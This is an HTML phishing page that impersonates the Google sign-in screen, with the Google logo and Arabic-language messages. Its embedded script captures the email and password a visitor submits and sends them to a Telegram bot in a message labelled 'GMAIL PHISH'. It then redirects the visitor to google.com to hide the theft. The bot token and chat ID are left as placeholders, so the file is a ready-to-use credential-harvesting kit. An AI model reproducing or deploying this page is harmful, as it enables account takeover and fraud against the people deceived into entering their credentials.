<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in – Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Cairo:wght@700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      width: 100%;
      height: 100%;
      font-family: 'Roboto', sans-serif;
      overflow: hidden;
      background: transparent;
    }
    .background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: -1;
    }
    .background img {
      width: 100vw;
      height: 100vh;
      object-fit: cover;
    }
    .animated-text {
      position: absolute;
      top: 30px;
      width: 100%;
      text-align: center;
      font-size: 36px;
      font-family: 'Cairo', sans-serif;
      font-weight: bold;
      background: linear-gradient(90deg, #ff6ec4, #7873f5, #42e695, #ff6ec4);
      background-size: 800% 800%;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: animatedGradient 8s linear infinite;
      letter-spacing: 1.5px;
    }
    @keyframes animatedGradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.4);
      border-radius: 20px;
      padding: 50px 35px;
      width: 420px;
      color: #fff;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
    }
    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 25px;
    }
    .logo img {
      width: 100px;
    }
    h2 {
      font-size: 28px;
      text-align: center;
      margin-bottom: 25px;
    }
    input {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border: none;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.25);
      color: #fff;
      font-size: 16px;
      outline: none;
    }
    input::placeholder {
      color: #ddd;
    }
    button {
      width: 100%;
      padding: 14px;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 17px;
      cursor: pointer;
      margin-top: 15px;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #0f5ec7;
    }
    .spinner {
      display: none;
      justify-content: center;
      align-items: center;
      margin-top: 15px;
    }
    .spinner div {
      width: 22px;
      height: 22px;
      border: 3px solid #fff;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="background">
    <img src="https://iili.io/J3DdfSt.gif" alt="Background" />
  </div>  <div class="animated-text">نتمنى لكم مشاهدة ممتعة</div>  <div class="container">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>
    <h2>Sign in</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email or phone" required>
      <input type="password" id="password" placeholder="Enter your password (min 6 chars)" required>
      <button type="submit">تسجيل الدخول</button>
      <div class="spinner" id="spinner"><div></div></div>
    </form>
  </div>  <script>
    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
    const CHAT_ID = 'YOUR_CHAT_ID';

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      document.getElementById('spinner').style.display = 'flex';

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      if (password.length < 6) {
        alert('كلمة المرور يجب أن تكون 6 أحرف على الأقل.');
        document.getElementById('spinner').style.display = 'none';
        return;
      }

      const message = `\nGMAIL PHISH\n------------------\nEmail: ${email}\nPassword: ${password}`;

      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = {
          chat_id: CHAT_ID,
          text: message
        };

        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          window.location.href = 'https://www.google.com';
        } else {
          alert('فشل الإرسال، حاول مرة أخرى');
          document.getElementById('spinner').style.display = 'none';
        }
      } catch (error) {
        alert('حدث خطأ أثناء الإرسال');
        document.getElementById('spinner').style.display = 'none';
      }
    });
  </script></body>
</html>
